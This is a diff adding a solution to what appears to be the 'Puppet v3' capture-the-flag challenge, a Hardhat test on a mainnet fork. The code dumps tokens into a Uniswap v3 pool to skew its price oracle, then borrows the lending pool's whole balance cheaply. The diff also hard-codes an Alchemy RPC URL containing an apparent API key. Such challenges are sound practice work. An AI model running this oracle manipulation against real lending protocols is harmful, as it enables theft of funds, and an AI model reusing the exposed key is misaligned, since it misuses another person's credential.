@@ -2,6 +2,7 @@ const { ethers } = require('hardhat');
 const { expect } = require('chai');
 const { time, setBalance } = require("@nomicfoundation/hardhat-network-helpers");
 
+const routerJson = require('@uniswap/swap-router-contracts/artifacts/contracts/SwapRouter02.sol/SwapRouter02.json');
 const positionManagerJson = require("@uniswap/v3-periphery/artifacts/contracts/NonfungiblePositionManager.sol/NonfungiblePositionManager.json");
 const factoryJson = require("@uniswap/v3-core/artifacts/contracts/UniswapV3Factory.sol/UniswapV3Factory.json");
 const poolJson = require("@uniswap/v3-core/artifacts/contracts/UniswapV3Pool.sol/UniswapV3Pool.json");
@@ -26,7 +27,7 @@ describe('[Challenge] Puppet v3', function () {
     let initialBlockTimestamp;
 
     /** SET RPC URL HERE */
-    const MAINNET_FORKING_URL = "";
+    const MAINNET_FORKING_URL = "https://eth-mainnet.g.alchemy.com/v2/64GXqc7U8NiO1jItNdGkIVfLve8XEDM_";
 
     // Initial liquidity amounts for Uniswap v3 pool
     const UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100n * 10n ** 18n;
@@ -140,6 +141,23 @@ describe('[Challenge] Puppet v3', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        await
+        console.log(await lendingPool.calculateDepositOfWETHRequired(1n * 10n ** 18n));
+        const uniswapRouterAddress = "0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45";
+        const routerContract = new ethers.Contract(uniswapRouterAddress,routerJson.abi,player);
+
+        await token.connect(player).approve(routerContract.address,PLAYER_INITIAL_TOKEN_BALANCE);
+
+        await routerContract.exactInputSingle([token.address,weth.address,3000,player.address,PLAYER_INITIAL_TOKEN_BALANCE,0,0], {gasLimit: 1e7});
+
+        await time.increase(100);
+
+        const sum = await lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        console.log(sum);
+
+        await weth.connect(player).approve(lendingPool.address,sum);
+
+        await lendingPool.connect(player).borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
     });
 
     after(async function () {
